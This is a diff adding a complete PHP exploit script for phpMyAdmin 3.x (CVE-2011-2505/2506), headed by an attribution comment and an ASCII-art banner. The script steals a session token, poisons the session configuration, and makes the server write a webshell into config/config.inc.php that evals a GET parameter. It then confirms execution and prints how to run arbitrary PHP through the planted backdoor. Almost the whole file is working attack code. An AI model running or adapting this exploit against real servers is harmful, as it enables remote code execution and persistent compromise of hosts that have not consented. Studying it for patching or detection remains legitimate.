@@ -1,0 +1,150 @@
+<?php /*
+# Exploit Title: phpMyAdmin 3.x Swekey Remote Code Injection Exploit
+# Date: 2011-07-09
+# Author: Mango of ha.xxor.se
+# Version: phpMyAdmin < 3.3.10.2 || phpMyAdmin < 3.4.3.1 
+# CVE : CVE-2011-2505, CVE-2011-2506
+# Advisory: http://www.xxor.se/advisories/phpMyAdmin_3.x_Multiple_Remote_Code_Executions.txt
+# Details: http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html
+*/
+echo php_sapi_name()!=='cli'?'<pre>':'';?>
+              .
+       ,      )\     .
+  .  ,/)   , /  ) ,  )\
+  )\(  /)/( (__( /( /  )          __      __              ________        __                    __
+ /  \  (   )|  |)  \  /          |  |\  /|  |            |  |  |  |      |  |                  (__)
+(  ______ / |  |_____(  ______   |  | \/ |  |  __    __  |  |__|  |   ___|  |  __ ___________   __   __ _____
+ \|  | \  \ |  |  |  |)|  | \  \ |  |    |  | |  |  |  | |  |  |  | /  / |  | |  |  |  |  |  | |  | |  |  |  |
+  |  |_/__/ |__|  |__| |  |_/__/ |__|    |__| |__|__|  | |__| [][]|[]__[]|[][]|_[]  |_[][]|_[] [][][]__|  |__|
+==|__|=================|__|=========================|__|======[]====[][]=|[]|[]=[]===[]==[]=[]===[]==============    
+   phpMyAdmin < 3.3.10.2 || phpMyAdmin < 3.4.3.1              [][]   []   [][]  []   []  [] []   []
+   Remote Code Injection                                      []    [][]  []    []   []  [] []   []
+   http://ha.xxor.se                                          [][] []  [] []    [][]  [][]  []   [] 
+	 _   _  ___ __ ____ __ ___  ___       
+	| |-| || _ |\   /\   /| _ ||   )      
+	|_|-|_||_|_|/_._\/_._\|___||_|_\      
+  ___  ___  ___ _  _  ___     ___ __ __  
+ (  < | [_ /  /| || ||   )(_)|   |\ | /
+  >__)|_[_ \__\|____||_|_\|_| |_|  |_|
+
+Use responsibly.
+
+<?php echo php_sapi_name()!=='cli'?'</pre>':'';
+
+if(php_sapi_name()==='cli'){
+	if(!isset($argv[1])){
+		output("   Usage\n    ".$argv[0]." http://example.com/phpMyAdmin-3.3.9.2");
+		killme();
+	}
+	$pmaurl = $argv[1];	
+}else{
+	$pmaurl = isset($_REQUEST['url'])?$_REQUEST['url']:'';
+}
+$code   = 'foreach($_GET as $k=>$v)if($k==="eval")eval($v);';
+$cookie = null;
+$token  = null;
+if(!function_exists('curl_init')){
+	output('[!] Fatal error. Need cURL!');
+	killme();
+}
+$ch     = curl_init();
+$debug  = 0;
+if(php_sapi_name()!=='cli'){
+?>
+<form method=post>
+URL: <input name=url value="<?php echo htmlspecialchars($pmaurl);?>"> Example: http://localhost:8080/phpMyAdmin-3.3.9.2<br/>
+<input name=submit type=submit value=?>
+</form>
+<pre>
+<?php
+if(!isset($_REQUEST['submit']))killme(true);
+}
+
+output("[i] Running...");
+
+// Start a session and get a token
+curl_setopt_array($ch, array(
+	CURLOPT_URL => $pmaurl.'/setup/index.php',
+	CURLOPT_HEADER => 1,
+	CURLOPT_RETURNTRANSFER => 1,
+	CURLOPT_TIMEOUT => 4,
+	CURLOPT_SSL_VERIFYPEER => false,
+	CURLOPT_SSL_VERIFYHOST => false
+));
+output("[*] Contacting server to retrive session cookie and token.");
+
+$result = curl_exec($ch);
+if(404 == curl_getinfo($ch, CURLINFO_HTTP_CODE)){
+	output("[!] Fail. $pmaurl/setup/index.php returned 404. The host is not vulnerable or there is a problem with the supplied url.");
+	killme();
+}
+if(!$result){
+	output("[!] cURL error:".curl_error($ch));
+	killme();
+}
+if(false !== strpos($result, 'Cannot load or save configuration')){
+	output("[!] Fail. Host not vulnerable. Web server writable folder $pmaurl/config/ does not exsist.");
+	killme();
+}
+
+// Extract cookie
+preg_match('/phpMyAdmin=([^;]+)/', $result, $matches);
+$cookie = $matches[1];
+output("[i] Cookie:".$cookie);
+// Extract token
+preg_match('/(token=|token" value=")([0-9a-f]{32})/', $result, $matches);
+$token = $matches[2];
+output("[i] Token:".$token);
+
+// Poison _SESSION variable
+curl_setopt($ch, CURLOPT_URL, $pmaurl.'/?_SESSION[ConfigFile][Servers][*/'.urlencode($code).'/*][port]=0&session_to_unset=x&token='.$token);
+curl_setopt($ch, CURLOPT_COOKIE, 'phpMyAdmin='.$cookie);
+output("[*] Contacting server to inject code into the _SESSION[ConfigFile][Servers] array.");
+if(!$result = curl_exec($ch)){
+	output("[!] cURL error:".curl_error($ch));
+	killme();
+}
+
+//echo htmlspecialchars($result,ENT_QUOTES);
+
+// Save file
+curl_setopt($ch, CURLOPT_URL, $pmaurl.'/setup/config.php');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'submit_save=Save&token='.$token);
+output("[*] Contacting server to make it save the injected code to a file.");
+if(!$result = curl_exec($ch)){
+	output("[!] cURL error:".curl_error($ch));
+	killme();
+}
+
+//echo htmlspecialchars($result,ENT_QUOTES);
+
+curl_setopt($ch, CURLOPT_URL, $pmaurl.'/config/config.inc.php?eval=echo%20md5(123);');
+curl_setopt($ch, CURLOPT_POST, 0);
+output("[*] Contacting server to test if the injected code executes.");
+if(!$result = curl_exec($ch)){
+	output("[!] cURL error:".curl_error($ch));
+	killme();
+}
+if(preg_match('/202cb962ac59075b964b07152d234b70/', $result)){
+	output("[!] Code injection successfull. This instance of phpMyAdmin is vulnerable!");
+	output("[+] Use your browser to execute PHP code like this $pmaurl/config/config.inc.php?eval=echo%20'test';");
+}else{
+	output("[!] Code injection failed. This instance of phpMyAdmin does not apear to be vulnerable.");
+}
+
+
+curl_close($ch);
+
+function output($msg){
+	echo php_sapi_name()!=='cli'?htmlspecialchars("$msg\n",ENT_QUOTES):"$msg\n";
+	flush();
+}
+
+function killme(){
+	output("[*] Exiting...");
+	echo php_sapi_name()!=='cli'?'<pre>':'';
+	die();
+}
+
+echo php_sapi_name()!=='cli'?'<pre>':'';?>
